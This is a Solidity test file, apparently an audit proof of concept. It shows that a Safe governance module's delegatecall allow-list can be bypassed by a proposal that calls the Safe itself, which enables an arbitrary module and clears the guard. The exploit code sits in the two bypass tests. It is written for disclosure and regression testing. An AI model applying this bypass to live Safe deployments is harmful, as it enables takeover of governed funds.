// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Operation} from "@gnosis-guild/zodiac-core/core/Operation.sol";
import {MerkleGovModule} from "../../src/zodiac/MerkleGovModule.sol";
import {MerkleGovModuleTest} from "../unit/MerkleGovModule.t.sol";

/// @notice quillshield proxy-upgrade-safety QP-001.
///
/// The M-4 delegatecall allow-list denies `Operation.DelegateCall` to a non-allowlisted
/// target at BOTH propose and execute. This PoC shows the constraint is bypassed by a
/// plain `Operation.Call` whose target is the Safe ITSELF: the Safe then calls itself,
/// `msg.sender == address(this)` satisfies Safe's `authorized` modifier, and the proposal
/// reaches `enableModule` / `setGuard` / owner surgery with no allow-list entry.
///
/// Reuses the repository's own MerkleGovModule harness (Safe + module + merkle voters).
contract QuillProxy_SafeSelfCallBypass is MerkleGovModuleTest {
    address internal constant ATTACKER_MODULE = address(uint160(0xBAD0));

    /// Baseline: the allow-list really does deny a delegatecall to the Safe.
    function test_QP001_delegatecall_to_safe_is_denied() public {
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        Operation[] memory operations = new Operation[](1);
        string[] memory descs = new string[](1);
        targets[0] = address(safe);
        calldatas[0] = abi.encodeWithSignature("enableModule(address)", ATTACKER_MODULE);
        operations[0] = Operation.DelegateCall;
        descs[0] = "";

        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(MerkleGovModule.DelegateCallNotAllowed.selector, address(safe)));
        govModule.propose(
            "deny", "d", targets, values, calldatas, operations, descs, votingPowers[alice], proofs[alice]
        );
    }

    /// The bypass: the SAME effect, via Operation.Call, is not constrained at all.
    function test_QP001_call_to_safe_enables_an_arbitrary_module() public {
        assertFalse(safe.isModuleEnabled(ATTACKER_MODULE), "precondition: attacker module not enabled");
        assertFalse(govModule.delegateCallAllowlist(address(safe)), "precondition: safe is NOT allowlisted");

        uint256 pid = _proposeAction(
            address(safe), abi.encodeWithSignature("enableModule(address)", ATTACKER_MODULE), Operation.Call
        );
        _passWithAliceYes(pid);

        (MerkleGovModule.Proposal memory p,,) = govModule.getProposal(pid);
        vm.roll(p.endBlock + govModule.executionDelay() + 1);

        govModule.execute(pid);

        assertTrue(
            safe.isModuleEnabled(ATTACKER_MODULE),
            "QP-001: one passing proposal enabled an arbitrary Safe module with no delegatecall and no allowlist entry"
        );
    }

    /// The same route reaches the guard slot, defeating SafeExecutionGuard's stated seal.
    function test_QP001_call_to_safe_can_clear_the_guard() public {
        uint256 pid =
            _proposeAction(address(safe), abi.encodeWithSignature("setGuard(address)", address(0)), Operation.Call);
        _passWithAliceYes(pid);
        (MerkleGovModule.Proposal memory p,,) = govModule.getProposal(pid);
        vm.roll(p.endBlock + govModule.executionDelay() + 1);

        govModule.execute(pid);

        // GuardManager stores the guard at keccak256("guard_manager.guard.address").
        bytes32 slot = 0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8;
        assertEq(uint256(vm.load(address(safe), slot)), 0, "QP-001: guard slot cleared by a plain Call proposal");
    }
}
